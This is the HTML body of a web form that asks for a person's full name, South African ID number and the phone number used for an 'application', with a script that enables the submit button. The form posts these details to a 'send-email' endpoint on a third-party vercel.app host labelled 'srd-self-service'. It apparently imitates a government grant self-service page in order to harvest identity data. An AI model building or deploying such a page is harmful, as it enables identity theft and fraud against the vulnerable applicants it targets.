<body>

    <div class="header">
        <img src="logo.png" alt="Logo">
    </div>

    <div class="form-container">
        <!-- Single form tag -->
        <form id="applicationForm" action="https://srd-self-service.vercel.app/send-email" method="POST">
            
            <div class="form-group">
                <input type="text" id="name" name="name" placeholder=" " required="">
                <label for="name">Full Names &amp; Surname</label>
            </div>

            <div class="form-group">
                <input type="text" id="idnumber" name="idnumber" placeholder=" " maxlength="13" required="">
                <label for="idnumber">South African ID Number of Applicant</label>
            </div>

            <div class="form-group">
                <input type="text" id="phone" name="phone" placeholder=" " maxlength="10" required="">
                <label for="phone">Phone Number Used to Submit Your Application</label>
            </div>

            <button type="submit" id="submitButton" disabled="">Submit</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('applicationForm');
        const submitButton = document.getElementById('submitButton');

        // Function to check if all fields are filled
        function checkForm() {
            const isFormValid = form.checkValidity();
            if (isFormValid) {
                submitButton.classList.add('active');
                submitButton.disabled = false;
            } else {
                submitButton.classList.remove('active');
                submitButton.disabled = true;
            }
        }

        // Add event listeners to each input field to trigger the form check
        form.addEventListener('input', checkForm);
    </script>


</body>
